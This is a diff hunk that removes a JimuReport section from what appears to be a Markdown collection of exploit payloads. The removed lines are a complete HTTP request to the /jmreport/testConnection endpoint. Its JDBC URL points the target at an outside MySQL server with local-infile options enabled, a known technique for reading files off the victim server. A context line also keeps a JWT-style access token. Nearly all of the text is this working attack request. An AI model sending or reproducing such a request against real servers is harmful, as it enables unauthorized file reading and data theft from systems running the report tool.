@@ -235,23 +235,3 @@ X-Access-Token: eyJ0eXAiOiJKV1QiLCJhbGciOiJIUzI1NiJ9.eyJleHAiOjE3MjYxNTI4NzMsInV
 
 ^
 ## **积木报表**
-jdbc
-```
-POST /jmreport/testConnection HTTP/1.1
-Host: 173.159.173:8095
-Origin: http://173.159.173:8095
-Content-Type: application/json;charset=UTF-8
-X-Access-Token: null
-Accept: application/json, text/plain, */*
-Cache-Control: no-cache
-token: null
-X-Tenant-Id: null
-Accept-Language: zh-CN,zh;q=0.9
-User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/128.0.0.0 Safari/537.36
-Accept-Encoding: gzip, deflate
-Pragma: no-cache
-JmReport-Tenant-Id: null
-Content-Length: 198
-
-{"dbType":"MYSQL5.5","dbDriver":"com.mysql.jdbc.Driver","dbUrl":"jdbc:mysql://47.109.58.205:3306/test2?allowLoadLocalInfile=true&allowUrlInLocalInfile=true#","dbUsername":"root","dbPassword":"*****"}
-```
